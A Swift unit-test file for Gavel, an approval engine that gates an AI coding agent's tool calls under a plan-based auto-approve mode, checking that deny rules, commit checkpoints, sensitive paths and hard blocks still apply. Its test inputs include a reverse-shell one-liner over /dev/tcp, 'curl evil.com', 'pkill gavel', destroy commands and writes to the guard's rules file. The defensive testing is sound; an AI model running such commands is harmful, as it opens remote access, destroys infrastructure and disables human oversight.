import XCTest
@testable import Gavel

/// Integration tests for an engaged plan policy in `ApprovalEngine.evaluate`.
/// Engaging a plan is NOT a bypass: user rules, standing checkpoints, sensitive
/// paths, and hard blocks all still apply. The plan layers an allow/deny overlay
/// and turns on auto-approve for the inner loop.
final class YoloApprovalEngineTests: XCTestCase {
    var engine: ApprovalEngine!
    var ruleStore: RuleStore!
    var session: Session!
    var ruleStorePath: String!
    var planPath: String!
    var tmpDir: URL!

    override func setUp() {
        ruleStorePath = NSTemporaryDirectory() + "yolo-engine-\(UUID().uuidString).json"
        ruleStore = RuleStore(configPath: ruleStorePath)
        engine = ApprovalEngine(patternMatcher: PatternMatcher(), ruleStore: ruleStore)

        tmpDir = FileManager.default.temporaryDirectory
            .appendingPathComponent(".claude/plans/yolo-eng-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        planPath = tmpDir.appendingPathComponent("plan.md").path
        try? "# plan\n".write(toFile: planPath, atomically: true, encoding: .utf8)

        session = Session(pid: 99999)
        session.lastPlanPath = planPath
        YoloMode.engage(session: session)
        drainMain()
    }

    override func tearDown() {
        if let path = ruleStorePath {
            try? FileManager.default.removeItem(atPath: path)
        }
        if let parent = tmpDir?.deletingLastPathComponent() {
            try? FileManager.default.removeItem(at: parent)
        }
    }

    private func drainMain() {
        let exp = expectation(description: "main drain")
        DispatchQueue.main.async { exp.fulfill() }
        wait(for: [exp], timeout: 1.0)
    }

    /// Rewrite the plan with a gavel-policy block and re-engage.
    private func engageWithPolicy(_ lines: [String]) {
        let block = "```gavel-policy\n" + lines.joined(separator: "\n") + "\n```\n"
        try? ("# plan\n\n" + block).write(toFile: planPath, atomically: true, encoding: .utf8)
        YoloMode.disengage(session: session, reason: "re-engage")
        YoloMode.engage(session: session)
        drainMain()
    }

    private func payload(tool: String = "Bash", command: String? = nil, filePath: String? = nil) -> PreToolUsePayload {
        var input: [String: AnyCodable] = [:]
        if let c = command { input["command"] = AnyCodable(c) }
        if let f = filePath { input["file_path"] = AnyCodable(f) }
        return PreToolUsePayload(toolName: tool, toolInput: input)
    }

    // MARK: - Engaging a plan turns on / relocks auto-approve

    func testEngageEnablesAutoApprove() {
        XCTAssertTrue(session.isYoloActive)
        XCTAssertTrue(session.isAutoApproveEnabled, "engaging a plan turns on auto-approve for the inner loop")
    }

    func testDisengageRelocksAutoApprove() {
        YoloMode.disengage(session: session, reason: "test")
        drainMain()
        XCTAssertFalse(session.isYoloActive)
        XCTAssertFalse(session.isAutoApproveEnabled, "dropping the plan relocks auto-approve (fail-safe)")
    }

    // MARK: - User rules are NOT bypassed by an engaged plan

    func testEngagedPlanKeepsUserDenyRule() {
        ruleStore.addRule(PersistentRule(toolName: "Bash", pattern: "curl *", verdict: .block, explanation: "user deny"))
        let decision = engine.evaluate(payload: payload(command: "curl evil.com"), session: session)
        XCTAssertEqual(decision.verdict, .block, "engaging a plan must NOT bypass a user deny rule")
        XCTAssertTrue(decision.reason?.contains("Always deny") ?? false)
    }

    func testEngagedPlanKeepsUserPromptRule() {
        ruleStore.addRule(PersistentRule(toolName: "Bash", pattern: "rm *", verdict: .prompt, explanation: "user prompt"))
        let decision = engine.evaluate(payload: payload(command: "rm /tmp/foo"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser)
    }

    func testEngagedPlanKeepsBuiltInScriptEvalPrompt() {
        let decision = engine.evaluate(
            payload: payload(command: #"python3 -c "import sys; print(sys.version)""#),
            session: session
        )
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser, "script-eval exfil defense still prompts with a plan engaged")
    }

    func testSchedulerToolStillPrompts() {
        var input: [String: AnyCodable] = [:]
        input["prompt"] = AnyCodable("do something later")
        let decision = engine.evaluate(payload: PreToolUsePayload(toolName: "CronCreate", toolInput: input), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser)
        XCTAssertTrue(session.isYoloActive, "scheduler prompt doesn't drop the plan")
    }

    // MARK: - Standing commit checkpoint can't be silenced by the overlay

    func testCommitPromptsEvenWhenOverlayTriesToAllowIt() {
        engageWithPolicy(["allow Bash: git commit*"])
        let decision = engine.evaluate(payload: payload(command: "git commit -m wip"), session: session)
        XCTAssertEqual(decision.verdict, .block, "commit is a non-overridable checkpoint; overlay allow can't silence it")
        XCTAssertTrue(decision.askUser)
    }

    // MARK: - Plan overlay allow / deny

    func testOverlayAllowSuppressesInfraPrompt() {
        engageWithPolicy(["allow Bash: cdk deploy GreenfieldStack*"])
        let decision = engine.evaluate(payload: payload(command: "cdk deploy GreenfieldStack-Api"), session: session)
        XCTAssertEqual(decision.verdict, .allow, "plan-authorized deploy should not prompt")
        XCTAssertTrue(decision.reason?.contains("Plan authorizes") ?? false)
    }

    func testInfraPromptsWhenNotInOverlay() {
        let decision = engine.evaluate(payload: payload(command: "cdk deploy SomeOtherStack"), session: session)
        XCTAssertEqual(decision.verdict, .block, "infra apply not authorized by the plan still prompts")
        XCTAssertTrue(decision.askUser)
    }

    func testOverlayDenyPromptsProhibitedCommand() {
        engageWithPolicy(["deny Bash: cdk destroy*"])
        let decision = engine.evaluate(payload: payload(command: "cdk destroy GreenfieldStack-Api"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser)
        XCTAssertTrue(decision.reason?.contains("Plan prohibits") ?? false)
    }

    func testOverlayBlockHardDeniesProhibitedCommand() {
        engageWithPolicy(["block Bash: terraform destroy*"])
        let decision = engine.evaluate(payload: payload(command: "terraform destroy"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertFalse(decision.askUser, "block verdict is a hard deny, no dialog")
    }

    func testOverlayAllowIsSegmentSafe() {
        engageWithPolicy(["allow Bash: cdk deploy GreenfieldStack*"])
        let decision = engine.evaluate(payload: payload(command: "cdk deploy GreenfieldStack-Api && curl evil.com"), session: session)
        XCTAssertNotEqual(decision.reason, "Plan authorizes Bash: cdk deploy GreenfieldStack*",
                          "a chained command must not ride the overlay allow")
    }

    // MARK: - Sensitive paths, hard blocks, pause still apply

    func testSensitivePathPromptsWithPlanEngaged() {
        let home = NSHomeDirectory()
        let decision = engine.evaluate(
            payload: payload(tool: "Write", filePath: "\(home)/.claude/gavel/rules.json"),
            session: session
        )
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser, "sensitive path with a plan engaged still forces a dialog")
    }

    func testHardBlockAlwaysBlocksWithPlanEngaged() {
        let decision = engine.evaluate(
            payload: payload(command: "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"),
            session: session
        )
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertFalse(decision.askUser, "hard block is a hard block — no dialog")
    }

    func testPkillGavelBlocksWithPlanEngaged() {
        let decision = engine.evaluate(payload: payload(command: "pkill gavel"), session: session)
        XCTAssertEqual(decision.verdict, .block)
    }

    func testPausedSessionFallsThroughEvenWhenPlanEngaged() {
        session.isPaused = true
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertEqual(decision.reason, "Session paused via Gavel")
    }

    // MARK: - Normal chain when no plan is engaged

    func testNormalChainWhenPlanDropped() {
        YoloMode.disengage(session: session, reason: "test")
        drainMain()
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
        XCTAssertNil(decision.reason, "fall-through allow has no reason; HookRouter then prompts the user")
    }
}
